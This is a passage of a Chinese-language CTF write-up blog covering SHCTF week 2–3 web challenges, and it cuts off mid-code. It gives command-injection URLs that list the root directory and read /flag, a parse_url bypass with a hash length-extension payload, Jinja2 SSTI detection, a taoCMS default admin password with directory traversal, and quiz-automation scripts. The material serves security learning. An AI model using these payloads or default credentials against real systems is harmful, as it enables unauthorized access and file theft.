ok，</p>\n<p>接下来就可以在 shell 参数中执行命令了，由于命令无回显，所以我们可以用 tee 命令或者 &gt; 来将内容输出到一个文件中，需要注意的是这里无法直接在根目录中查看文件，所以我们新建一个目录：</p>\n<blockquote>\n<p>/?exec=ok&amp;shell=mkdir%20./static;ls%20/&gt;./static/1.txt</p>\n</blockquote>\n<p>这样再查看 /static/1.txt</p>\n<blockquote>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bin</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>dev</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>etc</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>home</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>lib</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>media</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mnt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>opt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>proc</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>root</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>run</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sbin</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>srv</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>start.sh</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sys</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>tmp</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>usr</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>var</pre></td></tr></table></figure></blockquote>\n<p>最后 /?exec=ok&amp;shell=cat%20/flag&gt;./static/2.txt</p>\n<p>即可。</p>\n<h3 id=\"week2md5的事就拜托了\"><a class=\"anchor\" href=\"#week2md5的事就拜托了\">#</a> [WEEK2] MD5 的事就拜托了</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SHCTF'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token function\">parse_url</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SHCTF'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$$scheme</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'SHCTF'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'length'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'length'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">*</span><span class=\"token number\">100</span><span class=\"token operator\">!=</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">*</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SHCTF'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SHCTF'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token operator\">.</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag is\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>首先我们得让 $$$scheme 为 &quot;SHCTF&quot; 才可得到 md5 加密后的 flag。</p>\n<p>关于 parse_url 可以查看官方文档介绍：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24ucGFyc2UtdXJsLnBocA==\">parse_url</span></p>\n<p>我们可以这样构造 SHCTF</p>\n<blockquote>\n<p>SHCTF=query://SHCTF?host</p>\n</blockquote>\n<p>这样首先 $scheme=query</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi><mo>=</mo><mi>h</mi><mi>o</mi><mi>s</mi><mi>t</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">query=host,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mpunct\">,</span></span></span></span>host=SHCTF，就满足条件了。</p>\n<p>然后 num 可以传入 1.001 绕过。</p>\n<p>得到回显：</p>\n<blockquote>\n<p>8c947bf286d25d0805797c171951504e<br />\n42</p>\n</blockquote>\n<p>然后就是最后一块的绕过了，说白了就是 SHCTF 的值的和 flag 和 num 拼接的字符串 md5 加密后的值相等。</p>\n<p>具体可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvZGF0YWJhc2UvMTY0MDE5Lmh0bWw=\">Hash 拓展长度攻击原理剖析</span></p>\n<p>工具可以用这个：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NoZWxsZmVlbC9oYXNoLWV4dC1hdHRhY2s=\">https://github.com/shellfeel/hash-ext-attack</span></p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/16.png\" alt=\"15\" /></p>\n<blockquote>\n<p>?length=%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%0012</p>\n<p>SHCTF=5834b838307ee5fca039ea91e47101c8</p>\n</blockquote>\n<p>传入后即可得到 flag。</p>\n<h3 id=\"week2ez_ssti\"><a class=\"anchor\" href=\"#week2ez_ssti\">#</a> [WEEK2]ez_ssti</h3>\n<p>这道题就是一道 python 的 SSTI，没有任何过滤，参数是 name，</p>\n<p>可以参考这几篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYm1qb2tlci9wLzEzNTA4NTM4Lmh0bWw=\">SSTI（模板注入）漏洞（入门篇）</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzU2MTA3MjY4L2FydGljbGUvZGV0YWlscy8xMjc5Mjc1ODI/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTJ+ZGVmYXVsdH5iYWlkdWpzX2JhaWR1bGFuZGluZ3dvcmR+ZGVmYXVsdC00LTEyNzkyNzU4Mi1ibG9nLTEyNTkxMDc2My4yMzUlNUV2MzglNUVwY19yZWxldmFudF9hbnRpX3QzX2Jhc2UmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS40MjQyLjMmYW1wO3V0bV9yZWxldmFudF9pbmRleD03\">SSTI (模板注入) 解析 和 ctf 做法</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaGV0aWFubGFiL3AvMTQxNTQ2MzUuaHRtbA==\">细说 SSTI</span></p>\n<p>尝试一下： <code>&#123;</code>   <code>&#123;7*'7'&#125;&#125;</code>  回显是 <code>7777777</code> ，判断是 <code>Jinja2</code>  模板 (如果回显是 49 则为 <code>Twig</code>  模板)</p>\n<p>使用 &lt;class 'flask.config.Config'&gt; 类，payload:</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/17.png\" alt=\"15\" /></p>\n<h3 id=\"week2easycms\"><a class=\"anchor\" href=\"#week2easycms\">#</a> [WEEK2]EasyCMS</h3>\n<p>打开可以知道是 <code>taoCMS</code> ，可以搜一下</p>\n<p>基本上都需要先登录到后台， 搜一个默认密码登进去后台</p>\n<p>跳转的时候，改一下就行</p>\n<pre><code class=\"language-Plaintext\">http://.../admin/admin.php\n</code></pre>\n<p>再搜一下，taoCMS 的默认密码</p>\n<pre><code class=\"language-Plaintext\">账户admin\n密码tao\n</code></pre>\n<p>在文件管理可以发现，可以目录穿越</p>\n<p>根目录读 flag 就行</p>\n<h3 id=\"week3快问快答\"><a class=\"anchor\" href=\"#week3快问快答\">#</a> [WEEK3] 快问快答</h3>\n<blockquote>\n<pre><code>男：尊敬的领导，老师\n女：亲爱的同学们\n合：大家下午好！\n男：伴着优美的音乐，首届SHCTF竞答比赛拉开了序幕。欢迎大家来到我们的比赛现场。\n</code></pre>\n</blockquote>\n<p>解题思路</p>\n<p>看源码部分，可以看到一些提示</p>\n<pre><code class=\"language-HTML\">&lt;body&gt;\n    &lt;h1&gt;SHCTF 快问快答&lt;/h1&gt;\n    &lt;p class=&quot;message&quot;&gt;连续答对50题得到flag&lt;br&gt;&lt;/p class=&quot;message&quot;&gt;\n    &lt;form method=&quot;POST&quot;&gt;\n        &lt;h3&gt;题目：7715 ÷ 2976 = ?&lt;/h3&gt;\n        &lt;!-- tips: &quot;与&quot; &quot;异或&quot;  就是二进制的&quot;与&quot;   &quot;异或&quot; 运算 --&gt;\n        &lt;!-- 怕写成^ &amp;不认识（ --&gt;\n        &lt;input type=&quot;number&quot; placeholder=&quot;请输入答案&quot; name=&quot;answer&quot; required&gt;\n        &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;\n    &lt;/form&gt;\n    &lt;p&gt;你已经答对了0题&lt;/p&gt;\n    &lt;!-- 出错后成绩归零0 --&gt;\n    &lt;p class=&quot;message&quot;&gt;&lt;/p class=&quot;message&quot;&gt;\n&lt;/body&gt;\n</code></pre>\n<p>测试可以知道，要求在题目刷新后的 1~2 秒之间回答</p>\n<p>那肯定得用脚本做题了，注意本题的连续答对 50 次是不是对于整个容器，而是对用户分配了 token</p>\n<p>所以不能只用 requests 库的 get，至少要用 requests 的 <code>Session</code>  类</p>\n<p>做之前可以学习一下 re 库：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0Y2FhYS9hcnRpY2xlL2RldGFpbHMvODM4NjQyMTA=\">python re 库 详解 (正则表达式）</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L3JlLmh0bWwjZnVuY3Rpb25z\">https://docs.python.org/zh-cn/3/library/re.html#functions</span></p>\n<p>以下官方脚本:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://112.6.51.212:32865/'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>session <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\"># try:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    response <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>verify<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    x <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\"># 定义正则表达式模式</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    pattern <span class=\"token operator\">=</span> <span class=\"token string\">r'&lt;h3>(.*?)&lt;/h3>'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token comment\"># 使用 re 模块的 findall 方法匹配所有符合模式的字符串</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    result <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span>pattern<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'='</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    answer <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'÷'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'//'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'异或'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'与'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'&amp;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>answer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token string\">'answer'</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>answer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    x2 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">#print(x2.text)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'&lt;p>(.*?)&lt;/p>'</span><span class=\"token punctuation\">,</span> x2<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'&lt;p class=\"message\">(.*?)&lt;/p class=\"message\">'</span><span class=\"token punctuation\">,</span> x2<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token comment\">#print(x2.cookies)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>x2<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>再来看用 js 的做法，以下 exp 来自 未定义变量 师傅</p>\n<pre><code class=\"language-JavaScript\">setTimeout(() =&gt; &#123;\n    source = document.querySelector(&quot;body &gt; form &gt; h3&quot;).innerText.substr(3).split(' ');\n    a = parseInt(source[0]); op = source[1]; b = parseInt(source[2]);\n    calc = (a, op, b) =&gt; &#123;\n        if (op == 'x') &#123;\n            return a * b;\n        &#125; else if (op == '+') &#123;\n            return a + b;\n        &#125; else if (op == '-') &#123;\n            return a - b;\n        &#125; else if (op == '与') &#123;\n            return a &amp; b;\n        &#125; else if (op == '÷') &#123;\n            return a / b;\n        &#125; else if (op == '异或') &#123;\n            return a ^ b;\n        &#125;\n    &#125;\n    document.querySelector(&quot;body &gt; form &gt; input[type=number]&quot;).value = parseInt(calc(a, op, b)).toString();\n    document.querySelector(&quot;body &gt; form &gt; button&quot;).click();\n&#125;, 500)\n</code></pre>\n<p><code>Nebula</code>  师傅使用 selenium 库 模拟点击的脚本</p>\n<pre><code class=\"language-Python\">import time\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nurl='http://112.6.51.212:32321/'#修改 url 地址即可\ndriver = webdriver.Edge() # 使用 Edge 浏览器，可以根据需要选择其他浏览器driver.maximize_window() #窗口最大化\ndriver.get(url)\n#访问登录页面\nfor i in range(50):\n    problem=driver.find_element(By.TAG_NAME,'h3').text\n    problem=problem[3:-3]\n    print(problem)\n    if '与' in problem:\n        problem = problem.replace('与', '&amp;')\n    if '异或' in problem:\n        problem = problem.replace('异或', '^')\n    if '÷' in problem:\n        problem = problem.replace('÷', '//')\n    if 'x' in problem:\n        problem = problem.replace('x', '*')\n    #time.sleep(10)\n    print('-------------------')\n    result=eval(problem)\n    print(result)\n    print('-------------------')\n    driver.find_element(By.TAG_NAME,'input').click()\n    driver.find_element(By.TAG_NAME,'input').send_keys(result)\n    time.sleep(1)\n    driver.find_element(By.TAG_NAME,'button').click()\n    a=driver.find_element(By.TAG_NAME,'p')\ninput(&quot;按 Enter 键关闭浏览器...&quot;)\n</code></pre>\n<p>真。长见识了.</p>\n<h3 id=\"week3sseerriiaalliizzee\"><a class=\"anchor\" href=\"#week3sseerriiaalliizzee\">#</a> [WEEK3]sseerriiaalliizzee</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Start</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$barking</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">barking</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">barking</span><span class=\"token operator\">-></span><span class=\"token function\">dosomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CTF</span><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$part1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$part2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$part1</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$part2</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">part1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$part1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">part2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$part2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">dosomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$useless</span>   <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'&lt;?php die(\"+Genshin Impact Start!+\");?>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$useful</span><span class=\"token operator\">=</span> <span class=\"token variable\">$useless</span><span class=\"token operator\">.</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">part2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span> <span class=\"token property\">part1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$useful</span><span class=\"token punctuation\">)</span><span class=\"token 